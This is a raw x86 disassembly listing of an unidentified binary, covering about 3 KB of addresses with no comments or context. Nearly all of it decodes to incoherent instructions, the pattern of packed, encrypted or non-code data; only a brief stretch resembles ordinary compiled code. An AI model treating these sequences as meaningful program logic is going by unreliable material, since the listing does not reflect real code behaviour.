  412c03:	add    BYTE PTR [esi-0x6e],cl
  412c06:	ror    BYTE PTR [ebx-0x7f8ef77c],1
  412c0c:	pop    eax
  412c0d:	sub    eax,DWORD PTR ds:0x10364a32
  412c13:	and    ch,BYTE PTR [esi-0x1b]
  412c16:	cmp    DWORD PTR [ebp+0x545916ba],0xec3096cd
  412c20:	pop    eax
  412c21:	jb     0x412bec
  412c23:	out    dx,eax
  412c24:	sub    eax,0xa4bba79a
  412c29:	fld    TBYTE PTR [edx+eiz*2+0x5a]
  412c2d:	sub    dh,ch
  412c2f:	sbb    eax,DWORD PTR [eax+eax*1+0x52f7fb9f]
  412c36:	cmp    BYTE PTR [edx+0x726b7b3],dl
  412c3c:	test   BYTE PTR [edx+ebp*2-0x48],bl
  412c40:	inc    edx
  412c41:	repz push 0x4e
  412c44:	aas    
  412c45:	mov    cl,0x8c
  412c47:	pusha  
  412c48:	mov    DWORD PTR [esi+0x2b],ecx
  412c4b:	and    al,0x1b
  412c4e:	into   
  412c4f:	retf   0x3d5
  412c52:	mov    al,ds:0x5880001f
  412c57:	push   es
  412c58:	imul   esp,DWORD PTR [eax+0x2fcbe275],0xc4b3b2b6
  412c62:	into   
  412c63:	pop    esp
  412c64:	mul    ah
  412c66:	ins    DWORD PTR es:[edi],dx
  412c67:	pop    ecx
  412c68:	je     0x412bf5
  412c6a:	fwait
  412c6b:	mov    bl,0x26
  412c6d:	inc    edx
  412c6e:	jae    0x412ced
  412c70:	jnp    0x412ca5
  412c72:	cmp    DWORD PTR [ecx+eax*2],0x7c701adc
  412c79:	pop    ebp
  412c7a:	dec    ecx
  412c7b:	or     BYTE PTR [ecx-0x21],0x1e
  412c7f:	enter  0x8ce9,0xfb
  412c83:	pop    ebp
  412c84:	dec    esi
  412c85:	inc    ebx
  412c86:	imul   ebp,DWORD PTR [eax+0x1a],0x69097a3d
  412c8d:	(bad)  [ecx]
  412c8f:	neg    BYTE PTR [esi+ecx*4-0x3a737f55]
  412c96:	push   es
  412c97:	inc    ebx
  412c98:	mov    esi,0xd92b7597
  412c9d:	imul   esi,DWORD PTR [ecx-0x28f9b879],0x683cb8e1
  412ca7:	dec    esi
  412ca8:	pop    ebp
  412ca9:	and    ecx,DWORD PTR [ebp-0x48f75619]
  412caf:	cmp    DWORD PTR [esi-0x18],esi
  412cb2:	pop    esi
  412cb3:	cmc    
  412cb4:	rcl    BYTE PTR [ecx],cl
  412cb6:	test   DWORD PTR [edi],ebp
  412cb8:	add    eax,0x490ab10b
  412cbd:	das    
  412cbe:	push   0x2682f690
  412cc3:	cs pop ecx
  412cc5:	nop
  412cc6:	xchg   esi,ebp
  412cc8:	jo     0x412c76
  412cca:	and    esi,edx
  412ccc:	jp     0x412cf7
  412cce:	mov    al,ds:0x8df1e1e3
  412cd3:	imul   eax
  412cd5:	inc    edx
  412cd6:	ins    BYTE PTR es:[edi],dx
  412cd7:	clc    
  412cd8:	pop    edx
  412cd9:	xchg   esp,eax
  412cda:	xlat   BYTE PTR ds:[ebx]
  412cdb:	and    al,0x8c
  412cdd:	jg     0x412ca9
  412cdf:	ret    
  412ce0:	nop
  412ce1:	jmp    0x1116:0xae6ad494
  412ce8:	fwait
  412ce9:	loopne 0x412cfb
  412ceb:	and    al,0xb6
  412ced:	jecxz  0x412d2f
  412cef:	xchg   esp,eax
  412cf0:	test   BYTE PTR [ebx],dl
  412cf2:	adc    eax,0xbef27f48
  412cf7:	adc    al,0xe6
  412cf9:	inc    edi
  412cfa:	inc    eax
  412cfb:	adc    eax,0x1dd67e9a
  412d00:	stc    
  412d01:	mov    dl,0x6a
  412d03:	and    DWORD PTR [edx+0x22],edi
  412d06:	call   0xf432:0x5dcb5b8a
  412d0d:	sbb    bl,BYTE PTR [ecx-0x1ab15507]
  412d13:	fstp   TBYTE PTR [eax+0x3f]
  412d16:	xchg   esp,esp
  412d18:	pop    esp
  412d19:	stos   BYTE PTR es:[edi],al
  412d1a:	cmp    esi,0x4b
  412d1d:	test   al,0xb4
  412d1f:	jmp    0x412d22
  412d21:	cmc    
  412d22:	and    DWORD PTR [esi+0x50],ebp
  412d25:	add    dh,ch
  412d27:	jmp    0x71fa:0xd15cc38f
  412d2e:	lds    ebp,FWORD PTR [ebp+esi*4+0x1d645eb0]
  412d35:	and    eax,DWORD PTR ds:0x7cc1e236
  412d3b:	shl    DWORD PTR [edi+0x18],0xc
  412d3f:	push   ds
  412d40:	cmp    DWORD PTR [edi-0x1a],esi
  412d43:	or     eax,0x9a7ee65a
  412d48:	and    DWORD PTR [ecx+0x14],0x21
  412d4c:	push   0x7823031f
  412d51:	sub    BYTE PTR [ebx+0x52],bh
  412d54:	cdq    
  412d55:	test   ch,cl
  412d57:	cmp    ah,cl
  412d59:	test   DWORD PTR [esi+esi*4-0xf180a6],0xcf3f9dc2
  412d64:	daa    
  412d65:	adc    eax,edx
  412d67:	push   ds
  412d68:	loop   0x412d16
  412d6a:	jne    0x412d16
  412d6c:	mov    eax,ds:0x89a67e05
  412d71:	popa   
  412d72:	movups XMMWORD PTR [eax-0x1],xmm1
  412d76:	xchg   edi,eax
  412d77:	std    
  412d78:	fs push 0xffffff89
  412d7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d7c:	out    0xee,al
  412d7e:	imul   ecx,DWORD PTR [esi-0x7d287f00],0xffffffb8
  412d85:	retf   
  412d86:	inc    esp
  412d87:	test   BYTE PTR [edx-0x415be839],bh
  412d8d:	xchg   esi,eax
  412d8e:	dec    edi
  412d8f:	cmp    eax,0x53288bbd
  412d94:	push   esi
  412d95:	loope  0x412db3
  412d97:	pop    esp
  412d98:	pop    edx
  412d99:	in     ax,0x83
  412d9c:	xor    ch,ch
  412d9e:	add    cl,BYTE PTR [eax]
  412da0:	stc    
  412da1:	mov    esp,0xb346ec94
  412da6:	or     al,0xc1
  412da8:	je     0x412d5a
  412daa:	and    dl,BYTE PTR [eax+0x12]
  412dad:	sub    edi,eax
  412daf:	mov    dh,0x68
  412db1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412db2:	jl     0x412d78
  412db4:	dec    esi
  412db5:	or     DWORD PTR [ebp-0x41ccdd09],ebp
  412dbb:	sti    
  412dbc:	dec    edx
  412dbd:	ret    
  412dbe:	add    bl,BYTE PTR [ecx+0x3c]
  412dc1:	test   DWORD PTR fs:[edx-0x2f],ecx
  412dc5:	fs push 0x3a201d1f
  412dcb:	add    al,BYTE PTR [ecx+0x3e6cd2c5]
  412dd1:	stc    
  412dd2:	bound  esp,QWORD PTR [esi+0x43ca896b]
  412dd8:	ret    
  412dd9:	dec    esp
  412dda:	push   0xf
  412ddc:	jae    0x412e4e
  412dde:	fchs   
  412de0:	sub    cl,BYTE PTR [ebx-0x41]
  412de3:	jmp    0x544a3f9c
  412de8:	outs   dx,DWORD PTR ds:[esi]
  412de9:	adc    BYTE PTR [edi],dl
  412deb:	push   eax
  412dec:	inc    esp
  412ded:	outs   dx,DWORD PTR ds:[esi]
  412dee:	cli    
  412def:	push   edx
  412df0:	xor    BYTE PTR [ebx],dh
  412df2:	test   eax,0xfe9f29d8
  412df7:	or     eax,0x784146c2
  412dfc:	jecxz  0x412db2
  412dfe:	mov    dl,0x53
  412e00:	pop    es
  412e01:	xor    BYTE PTR [eax+eax*4],dl
  412e04:	sub    DWORD PTR [edi+0x11],edx
  412e07:	fsub   st(5),st
  412e09:	or     ch,BYTE PTR [esi+0xa136204]
  412e0f:	mov    cl,0x92
  412e11:	popf   
  412e12:	loop   0x412df4
  412e14:	mov    BYTE PTR [ebx-0x1f3e2614],bl
  412e1a:	ficomp DWORD PTR [ebp-0x18c86947]
  412e20:	mov    ds:0x7c1591ff,eax
  412e25:	ret    
  412e26:	cmc    
  412e27:	ret    0x7f56
  412e2a:	aad    0x61
  412e2c:	add    BYTE PTR [eax+0x15e65d53],0x26
  412e33:	push   ecx
  412e34:	lahf   
  412e35:	lock adc eax,0x861d67c6
  412e3b:	and    eax,0x9761e432
  412e40:	and    DWORD PTR [edi+0x5a3e05a2],eax
  412e46:	pop    esi
  412e47:	jmp    0xfd60:0x1d24b0de
  412e4e:	push   ebp
  412e4f:	imul   eax,DWORD PTR [edi],0x24
  412e52:	fdivrp st(3),st
  412e54:	cmp    esi,edx
  412e56:	jle    0x412de3
  412e58:	popa   
  412e59:	adc    dl,BYTE PTR [edi+0x23]
  412e5c:	pop    eax
  412e5d:	dec    ebx
  412e5e:	add    eax,DWORD PTR [edi-0x62123e69]
  412e64:	aaa    
  412e65:	aaa    
  412e66:	fnsave [ebx-0x40]
  412e69:	sbb    DWORD PTR [ebx],esi
  412e6b:	inc    ebx
  412e6c:	ret    
  412e6d:	pop    ecx
  412e6e:	and    eax,0xab54223a
  412e73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412e74:	scas   eax,DWORD PTR es:[edi]
  412e75:	(bad)  [edx+esi*1]
  412e78:	in     al,dx
  412e79:	fisub  DWORD PTR [eax]
  412e7b:	mov    bh,0xa5
  412e7d:	xor    ebp,ebx
  412e7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412e80:	sub    al,0xc3
  412e82:	inc    ebp
  412e83:	fldcw  WORD PTR ds:0x9d86fdce
  412e89:	pusha  
  412e8a:	js     0x412e12
  412e8c:	test   BYTE PTR [edx],dh
  412e8e:	fwait
  412e8f:	dec    ebx
  412e90:	nop
  412e91:	imul   ebp,DWORD PTR [edx],0x48
  412e94:	ss dec edi
  412e96:	inc    esi
  412e97:	loope  0x412e72
  412e99:	rcl    esp,1
  412e9b:	cli    
  412e9c:	dec    ebx
  412e9d:	shr    cl,1
  412e9f:	iret   
  412ea0:	pop    edx
  412ea1:	cli    
  412ea2:	dec    ecx
  412ea3:	cmp    eax,0xbbcc4fd5
  412ea8:	repnz xchg esi,eax
  412eaa:	pop    eax
  412eab:	enter  0xfa25,0x39
  412eaf:	(bad)  
  412eb0:	push   ebp
  412eb1:	stos   DWORD PTR es:[edi],eax
  412eb2:	pop    esp
  412eb3:	call   0x71e1:0x52e7e66a
  412eba:	(bad)  
  412ebb:	jecxz  0x412ed7
  412ebd:	lea    edi,[eax]
  412ebf:	clc    
  412ec0:	sub    BYTE PTR [esi],dl
  412ec2:	data16 sbb ch,ch
  412ec5:	ffree  st(4)
  412ec7:	inc    edx
  412ec8:	aaa    
  412ec9:	out    dx,al
  412eca:	push   0xffffffdd
  412ecc:	mov    ah,0x85
  412ece:	out    0x7,al
  412ed0:	mov    al,ds:0x3162ffac
  412ed5:	loop   0x412f4d
  412ed7:	inc    eax
  412ed8:	out    dx,al
  412ed9:	jecxz  0x412e6f
  412edb:	call   0xb31d784d
  412ee0:	sar    DWORD PTR [eax],1
  412ee2:	xchg   ebp,eax
  412ee3:	push   esi
  412ee4:	pop    ebx
  412ee5:	jo     0x412eeb
  412ee7:	fdivr  DWORD PTR [esi+0xb]
  412eea:	retf   
  412eeb:	ds pop edx
  412eed:	out    dx,eax
  412eee:	inc    edi
  412eef:	addr16 dec edx
  412ef1:	out    dx,al
  412ef2:	lock pop edi
  412ef4:	xchg   esi,eax
  412ef5:	and    al,0x1d
  412ef7:	(bad)  
  412ef8:	mov    esi,0xc1d8eb0c
  412efd:	push   esi
  412efe:	xchg   esi,eax
  412eff:	idiv   BYTE PTR [ecx]
  412f01:	cmp    eax,0xd85c8747
  412f06:	jmp    0x412f13
  412f08:	fdiv   DWORD PTR [eax+0x24]
  412f0b:	mov    esi,0x2393ca91
  412f10:	sub    DWORD PTR [ecx+0x2bcad1ab],edi
  412f16:	pop    es
  412f17:	mov    edx,0xa437d586
  412f1c:	jp     0x412eb9
  412f1e:	retf   0x399
  412f21:	scas   al,BYTE PTR es:[edi]
  412f22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f23:	leave  
  412f24:	je     0x412ef1
  412f26:	scas   al,BYTE PTR es:[edi]
  412f27:	mov    edx,0x65ce534a
  412f2c:	mov    edi,0x719d39f1
  412f31:	lods   al,BYTE PTR ds:[esi]
  412f32:	jo     0x412f79
  412f34:	pop    edx
  412f35:	cli    
  412f36:	push   ebx
  412f37:	dec    ebx
  412f38:	push   cs
  412f39:	jbe    0x412edd
  412f3b:	adc    BYTE PTR [esi-0x3cc80dd0],ah
  412f41:	dec    ebp
  412f42:	(bad)  
  412f43:	enter  0x8791,0xf6
  412f47:	mov    DWORD PTR [ebp+0x2],eax
  412f4a:	and    al,0xfc
  412f4c:	adc    al,BYTE PTR [ecx+0x2f80067d]
  412f52:	and    al,0x1e
  412f54:	push   DWORD PTR [ecx-0x42]
  412f57:	(bad)  
  412f58:	(bad)  
  412f5a:	add    al,BYTE PTR [edx]
  412f5c:	je     0x412fd6
  412f5e:	pop    edi
  412f5f:	inc    esi
  412f60:	idiv   BYTE PTR [edx+edx*1]
  412f63:	push   0x56
  412f65:	mov    eax,0xaaac6c8e
  412f6a:	adc    DWORD PTR [edi+ebx*2-0x78dafea1],edi
  412f71:	dec    edi
  412f72:	pop    edi
  412f73:	push   es
  412f74:	sub    bl,BYTE PTR [edx-0x5d]
  412f77:	xor    ecx,edx
  412f79:	in     al,dx
  412f7a:	test   BYTE PTR [ebx-0x37],ch
  412f7d:	sbb    ebx,0x37f465c6
  412f83:	lahf   
  412f84:	xor    bh,al
  412f86:	push   edx
  412f87:	pop    ecx
  412f88:	repz sbb eax,0x675164a7
  412f8e:	xchg   edi,eax
  412f8f:	sub    dl,BYTE PTR [esi+0x79]
  412f92:	lods   eax,DWORD PTR ds:[esi]
  412f93:	mov    dl,0x99
  412f95:	fidiv  DWORD PTR [ebx]
  412f97:	loopne 0x412f72
  412f99:	hlt    
  412f9a:	and    al,0x86
  412f9c:	sbb    DWORD PTR [esi],ebp
  412f9e:	jmp    0xcbb1:0x4aaee6d1
  412fa5:	and    BYTE PTR [ecx-0x28c8135],dl
  412fab:	pushf  
  412fac:	push   ebp
  412fad:	sub    eax,0xda59b04d
  412fb2:	mov    ds:0x892cd246,eax
  412fb7:	xor    al,0x33
  412fb9:	dec    ebp
  412fba:	pop    es
  412fbb:	push   ebx
  412fbc:	xor    al,0xf1
  412fbe:	jmp    0x41301b
  412fc0:	loope  0x412fdd
  412fc2:	push   cs
  412fc3:	fwait
  412fc4:	sub    al,0xb4
  412fc6:	xchg   BYTE PTR [ebx+0x2ad05776],bh
  412fcc:	loop   0x412fe4
  412fce:	jl     0x412f9f
  412fd0:	sbb    edx,ebx
  412fd2:	add    DWORD PTR [ebp+0x65fb574e],esp
  412fd8:	(bad)  
  412fda:	mov    edx,0x6c1a126c
  412fdf:	jmp    FWORD PTR [edi+0x341106d7]
  412fe5:	loopne 0x412f7e
  412fe7:	dec    ecx
  412fe8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412fe9:	sub    dh,dh
  412feb:	fsub   st,st(4)
  412fed:	mov    bh,0x5e
  412fef:	inc    esp
  412ff0:	add    eax,0x19a8319d
  412ff5:	push   edi
  412ff6:	sbb    al,0xb0
  412ff8:	push   ds
  412ff9:	sbb    BYTE PTR [edi],cl
  412ffb:	rcr    BYTE PTR [esi-0x2705ae3d],1
  413001:	and    DWORD PTR [ecx-0x573b66aa],0x271ae690
  41300b:	xchg   esi,eax
  41300c:	popa   
  41300d:	and    ah,bh
  41300f:	xchg   esi,eax
  413010:	mov    al,ds:0xbeb05584
  413015:	retf   
  413016:	sub    eax,0xf71874d
  41301b:	scas   eax,DWORD PTR es:[edi]
  41301c:	mov    bh,0x1
  41301e:	in     eax,0x31
  413020:	call   FWORD PTR [ecx]
  413022:	repnz das 
  413024:	inc    ebx
  413025:	sbb    eax,0xa6b0ab0e
  41302a:	sar    BYTE PTR [ecx+0x4857e8d],0xf6
  413031:	mov    ecx,DWORD PTR [eax-0x11]
  413034:	pop    ebp
  413035:	scas   al,BYTE PTR es:[edi]
  413036:	add    eax,0x639be3c0
  41303b:	call   0x4:0x9490bb33
  413042:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413043:	mov    BYTE PTR [ebx+0xea25a91],bl
  413049:	xchg   ebp,eax
  41304a:	mov    esi,0xf52d7fda
  41304f:	dec    esi
  413050:	call   0x5f6f:0xf8fdd02a
  413057:	inc    ecx
  413058:	push   es
  413059:	sub    DWORD PTR [edi],ebx
  41305b:	dec    eax
  41305c:	(bad)  
  41305d:	cmp    BYTE PTR [ebp+ecx*1-0x36303216],ch
  413064:	pop    eax
  413065:	push   esi
  413066:	push   cs
  413067:	cdq    
  413068:	scas   al,BYTE PTR es:[edi]
  413069:	mov    edx,0x9d661208
  41306e:	sub    edx,ecx
  413070:	retf   0xd847
  413073:	je     0x4130af
  413075:	imul   eax,DWORD PTR [esi+0x33c14576],0xffffffc7
  41307c:	shl    ecx,0x1e
  41307f:	xor    edx,edx
  413081:	or     eax,edx
  413083:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  413087:	mov    eax,DWORD PTR [ebp+0x14]
  41308a:	or     BYTE PTR [eax],cl
  41308c:	mov    eax,DWORD PTR [ebp-0x48]
  41308f:	mov    ecx,DWORD PTR [ebp-0x44]
  413092:	shrd   eax,ecx,0x2
  413096:	shr    ecx,0x2
  413099:	mov    ecx,DWORD PTR [ebp-0x48]
  41309c:	mov    edx,DWORD PTR [ebp-0x44]
  41309f:	xor    eax,edi
  4130a1:	xor    edx,edx
  4130a3:	or     eax,edx
  4130a5:	add    eax,DWORD PTR ds:0x422298
  4130ab:	shl    ecx,0x1e
  4130ae:	mov    DWORD PTR [ebp+0x14],eax
  4130b1:	jmp    0x41363b
  4130b6:	xchg   ebx,eax
  4130b7:	fadd   DWORD PTR [eax]
  4130b9:	mov    eax,ds:0xd89398c0
  4130be:	out    0x8d,al
  4130c0:	shr    BYTE PTR [eax-0x51899cda],cl
  4130c6:	mov    dh,0x10
  4130c8:	or     al,0x16
  4130ca:	cmp    eax,0x19161604
  4130cf:	test   al,cl
  4130d1:	aaa    
  4130d2:	(bad)  
  4130d3:	jmp    0xb4ed8933
  4130d8:	lods   al,BYTE PTR ds:[esi]
  4130d9:	in     eax,0x76
  4130db:	aad    0xc9
  4130dd:	mov    dl,0xa7
  4130df:	dec    ebp
  4130e0:	(bad)  [eax]
  4130e2:	(bad)  
  4130e3:	push   ds
  4130e4:	cmp    DWORD PTR [edx+0x31],eax
  4130e7:	dec    esi
  4130e8:	xchg   BYTE PTR [ebx],ch
  4130ea:	xor    al,0x50
  4130ec:	push   eax
  4130ed:	and    eax,0xf2773b6f
  4130f2:	and    esp,DWORD PTR [edi-0xae8f65c]
  4130f8:	sti    
  4130f9:	fwait
  4130fa:	jbe    0x4130a5
  4130fc:	inc    ecx
  4130fd:	mov    ch,0x79
  4130ff:	pop    es
  413100:	push   0x2e1c0a9e
  413105:	cli    
  413106:	in     al,dx
  413107:	(bad)
  41310a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41310b:	xor    al,0x99
  41310d:	rol    esp,cl
  41310f:	out    dx,eax
  413110:	pop    ebx
  413111:	popf   
  413112:	xor    eax,0xf70ec768
  413117:	outs   dx,BYTE PTR ds:[esi]
  413118:	sub    edi,DWORD PTR [eax+0x65]
  41311b:	pop    esp
  41311c:	or     al,0x48
  41311e:	push   ebp
  41311f:	pop    ecx
  413120:	clc    
  413121:	sbb    dl,BYTE PTR [ebx]
  413123:	xor    ecx,DWORD PTR [ebx]
  413125:	inc    edi
  413126:	sbb    edx,DWORD PTR [edi+0x1e46031e]
  41312c:	test   eax,0xe2ce34f0
  413131:	(bad)  
  413132:	fimul  DWORD PTR [esi+0x716d0fa1]
  413138:	je     0x4130fb
  41313a:	mov    esi,0x4bc08a1b
  41313f:	jb     0x413163
  413141:	dec    ebx
  413142:	and    al,0x52
  413144:	fsubr  QWORD PTR [eax]
  413146:	fisttp WORD PTR [edi+0xa]
  413149:	push   eax
  41314a:	test   BYTE PTR [eax],0x9e
  41314d:	xchg   edi,eax
  41314e:	test   eax,0x1bca31d3
  413153:	mov    edi,0x13d9239a
  413158:	nop
  413159:	or     ax,0xe528
  41315d:	in     eax,dx
  41315e:	push   ds
  41315f:	pop    ds
  413160:	mov    DWORD PTR [edx],esi
  413162:	xchg   edi,eax
  413163:	out    0x7a,al
  413165:	ss (bad) 
  413167:	fadd   DWORD PTR ds:0xec936ecc
  41316d:	(bad)  
  41316e:	bnd jp 0x413173
  413171:	sub    BYTE PTR [ecx-0x13],bh
  413174:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413175:	lahf   
  413176:	push   ecx
  413177:	dec    edx
  413178:	fist   DWORD PTR [eax-0x7a]
  41317b:	push   edi
  41317c:	push   eax
  41317d:	leave  
  41317e:	add    eax,DWORD PTR [edi-0x43]
  413181:	and    bl,cl
  413183:	xor    BYTE PTR ds:0xa2af6f49,0xf8
  41318a:	lea    eax,[ebp+0x518d1c8e]
  413190:	cwde   
  413191:	rol    DWORD PTR [ebx],0x35
  413194:	cli    
  413195:	jl     0x413164
  413197:	fs pop eax
  413199:	push   0x2878ae36
  41319e:	and    eax,esi
  4131a0:	jmp    0x4131ff
  4131a2:	icebp  
  4131a3:	les    esp,FWORD PTR [ebx+0x17002488]
  4131a9:	add    ah,BYTE PTR [ebp+0x48851c46]
  4131af:	xchg   ebx,eax
  4131b0:	pop    ebp
  4131b1:	mul    BYTE PTR [ebp+0x6b]
  4131b4:	call   0xb887:0x387b127a
  4131bb:	pushf  
  4131bc:	push   esi
  4131bd:	inc    ebp
  4131be:	mov    esp,0x7317d3de
  4131c3:	add    dl,BYTE PTR [ecx]
  4131c5:	push   ss
  4131c6:	scas   al,BYTE PTR es:[edi]
  4131c7:	mov    WORD PTR [ebx+0x57],fs
  4131ca:	cmp    dh,bl
  4131cc:	push   edx
  4131cd:	int3   
  4131ce:	(bad)  
  4131cf:	xchg   ebx,eax
  4131d0:	dec    esp
  4131d1:	shl    DWORD PTR fs:[eax+0x3bbd7e43],cl
  4131d8:	into   
  4131d9:	xor    dl,BYTE PTR [eax+eiz*8+0x4728a9c0]
  4131e0:	es test eax,0x8dc901c7
  4131e6:	cmp    dl,al
  4131e8:	outs   dx,DWORD PTR ds:[esi]
  4131e9:	addr16 pop es
  4131eb:	and    eax,DWORD PTR es:[esi]
  4131ee:	or     esp,DWORD PTR [eax+0x775abf13]
  4131f4:	cmp    DWORD PTR [eax-0x34],0x937c9d04
  4131fb:	pop    ebp
  4131fc:	xchg   bl,bl
  4131fe:	pop    eax
  4131ff:	ror    BYTE PTR [ecx],0xe7
  413202:	jge    0x413204
  413204:	popa   
  413205:	test   BYTE PTR [edi-0x57aa64ac],0x7f
  41320c:	xchg   esp,eax
  41320d:	push   ebp
  41320e:	and    esp,DWORD PTR [edx+ebx*1+0x51]
  413212:	sbb    edi,DWORD PTR [edx+0x58290ceb]
  413218:	inc    ebp
  413219:	pusha  
  41321a:	pop    ebx
  41321b:	and    eax,0x4254ca3b
  413220:	fst    DWORD PTR [esp+ebp*8+0x7425d461]
  413227:	mov    ds:0x40b3ec1d,eax
  41322c:	sub    BYTE PTR [ebx+0x38],0x84
  413230:	xor    dh,BYTE PTR [ebx+0x6968198c]
  413236:	mov    edi,0xebe949af
  41323b:	and    BYTE PTR [esi-0x65],0x33
  41323f:	mov    WORD PTR [esi+ebx*1-0x16],ds
  413243:	sbb    al,0x10
  413245:	pop    edx
  413246:	xchg   DWORD PTR [ecx],edx
  413248:	push   esp
  413249:	sar    DWORD PTR [ecx-0x2c266197],1
  41324f:	sbb    BYTE PTR [edi+0x5eba07f6],ch
  413255:	popa   
  413256:	sub    eax,0x6149021c
  41325b:	pop    esi
  41325c:	push   ecx
  41325d:	and    al,0x37
  41325f:	xor    eax,0x661f2368
  413264:	cmp    bh,BYTE PTR [ebp-0x3f2754a6]
  41326a:	shl    BYTE PTR [edx+0x1762fe2d],cl
  413270:	loope  0x4132b1
  413272:	repz pop ds
  413274:	lock data16 fmul DWORD PTR [bp+si+0x6a6c]
  41327b:	mov    ds:0x3b5cd152,eax
  413280:	in     eax,dx
  413281:	mov    esi,0x3aa27d69
  413286:	outs   dx,BYTE PTR ds:[esi]
  413287:	mov    al,0xf
  413289:	or     al,BYTE PTR [ecx-0x403236b9]
  41328f:	sbb    bl,ah
  413291:	clc    
  413292:	or     esp,ecx
  413294:	aas    
  413295:	mov    es,WORD PTR [esi+0x3ee86439]
  41329b:	fsub   st,st(7)
  41329d:	sub    DWORD PTR [edx],edx
  41329f:	test   eax,0x7f2b753
  4132a4:	clc    
  4132a5:	(bad)  
  4132a6:	aad    0xd7
  4132a8:	adc    eax,0x9beb415
  4132ad:	fdivr  QWORD PTR [edi]
  4132af:	xor    al,0x18
  4132b1:	or     BYTE PTR [edx-0x63],dl
  4132b4:	inc    ebp
  4132b5:	nop
  4132b6:	ret    0xb2fd
  4132b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4132ba:	xchg   BYTE PTR [esi*4+0x66693f6e],ah
  4132c1:	jecxz  0x4132dd
  4132c3:	mov    ?,WORD PTR [eax-0x4e593926]
  4132c9:	adc    DWORD PTR [ecx+0x2a],0xebf1d762
  4132d0:	pop    ebp
  4132d1:	mov    dh,0x25
  4132d3:	pop    ebx
  4132d4:	mov    ch,0x2
  4132d6:	jae    0x413357
  4132d8:	cmp    BYTE PTR ds:0xd76cdd40,ah
  4132de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4132df:	sbb    ebx,DWORD PTR ds:0x6bc26ace
  4132e5:	mov    eax,0xc227ade
  4132ea:	loope  0x413278
  4132ec:	iret   
  4132ed:	xor    ch,BYTE PTR [ebp-0x1b078807]
  4132f3:	sub    bh,cl
  4132f5:	es repnz push eax
  4132f8:	repnz mov edi,0x7857da84
  4132fe:	jns    0x41335b
  413300:	jg     0x4132e4
  413302:	sbb    BYTE PTR [ebx],0xa1
  413305:	sahf   
  413306:	inc    eax
  413307:	push   cs
  413308:	jmp    0x847f:0x1d2ce793
  41330f:	fucomip st,st(0)
  413311:	mov    edi,0x610a55ec
  413316:	inc    ebx
  413317:	xchg   ebx,eax
  413318:	jge    0x413331
  41331a:	in     al,0xd9
  41331c:	hlt    
  41331d:	pop    ds
  41331e:	sbb    DWORD PTR [ebx+0x20033f41],edx
  413324:	loop   0x4132d9
  413326:	mov    esp,DWORD PTR ds:0x133bec7
  41332c:	mov    esp,edi
  41332e:	popf   
  41332f:	rol    DWORD PTR [edi-0x516ec439],0x79
  413336:	mov    DWORD PTR [edi+ebx*1-0x80],eax
  41333a:	pushf  
  41333b:	fmul   DWORD PTR [edx+0x5cebbbe7]
  413341:	shl    cl,1
  413343:	arpl   WORD PTR [ecx+0x510f70ad],di
  413349:	int    0x4a
  41334b:	inc    esi
  41334c:	and    BYTE PTR gs:[edx-0x4c65753a],bl
  413353:	loope  0x41332f
  413355:	cld    
  413356:	mov    eax,0x9dd00658
  41335b:	cmp    DWORD PTR [esi+0x318dd321],ebp
  413361:	cmp    ecx,DWORD PTR [edi-0x32]
  413364:	xor    DWORD PTR [esi+0x38],ebx
  413367:	arpl   WORD PTR [edi+0x2801e637],bp
  41336d:	scas   al,BYTE PTR es:[edi]
  41336e:	sub    ebx,esp
  413370:	call   0x5b24:0xdc8dee07
  413377:	mov    ah,0xea
  413379:	into   
  41337a:	inc    esp
  41337b:	inc    esi
  41337c:	(bad)  
  41337d:	jns    0x4133f2
  41337f:	scas   eax,DWORD PTR es:[edi]
  413380:	xchg   DWORD PTR [edx+0x10],edx
  413383:	sub    ecx,esi
  413385:	mov    bl,0x1a
  413387:	sub    al,0x1f
  413389:	push   esp
  41338a:	jmp    0x4133ed
  41338c:	out    0xaa,al
  41338e:	mov    edi,DWORD PTR [ebx+0xd]
  413391:	push   ss
  413392:	retf   0xcc5a
  413395:	dec    ebp
  413396:	repz sub al,0x9f
  413399:	and    DWORD PTR [ebp-0x7b778971],ecx
  41339f:	cli    
  4133a0:	pop    ebp
  4133a1:	push   ss
  4133a2:	jb     0x4133d6
  4133a4:	mov    ah,0xf1
  4133a6:	aad    0xb7
  4133a8:	aaa    
  4133a9:	in     eax,0xcc
  4133ab:	rcl    BYTE PTR [edi],cl
  4133ad:	repz pop ebp
  4133af:	inc    edi
  4133b0:	jbe    0x413420
  4133b2:	add    al,0x7d
  4133b4:	and    ebp,DWORD PTR [esi-0x46]
  4133b7:	sahf   
  4133b8:	mov    al,ds:0x761e4365
  4133bd:	add    ah,BYTE PTR [edi+edx*4+0x21f7cbe9]
  4133c4:	ins    BYTE PTR es:[edi],dx
  4133c5:	mov    bh,0x63
  4133c7:	push   cs
  4133c8:	leave  
  4133c9:	(bad)  
  4133ca:	ja     0x4133b6
  4133cc:	mov    esp,0x3da47534
  4133d1:	sub    eax,0x40
  4133d4:	dec    DWORD PTR [eax+0x4d]
  4133d7:	mov    edi,0xe3a0b804
  4133dc:	cld    
  4133dd:	mov    bl,0x18
  4133df:	mov    dh,0xef
  4133e1:	or     edi,ecx
  4133e3:	pop    ss
  4133e4:	das    
  4133e5:	inc    ecx
  4133e6:	repnz cmp DWORD PTR [esi],ecx
  4133e9:	jbe    0x41343e
  4133eb:	pop    ecx
  4133ec:	or     DWORD PTR [esi],0xffffff9e
  4133ef:	inc    ebx
  4133f0:	sub    DWORD PTR [eax],ecx
  4133f2:	xchg   DWORD PTR [edx],eax
  4133f4:	inc    edx
  4133f5:	dec    edx
  4133f6:	jge    0x41338c
  4133f8:	mov    dh,0x4a
  4133fa:	aaa    
  4133fb:	pushf  
  4133fc:	mov    dl,0x2d
  4133fe:	outs   dx,BYTE PTR ds:[esi]
  4133ff:	or     al,0xc7
  413401:	js     0x413457
  413403:	hlt    
  413404:	pop    ecx
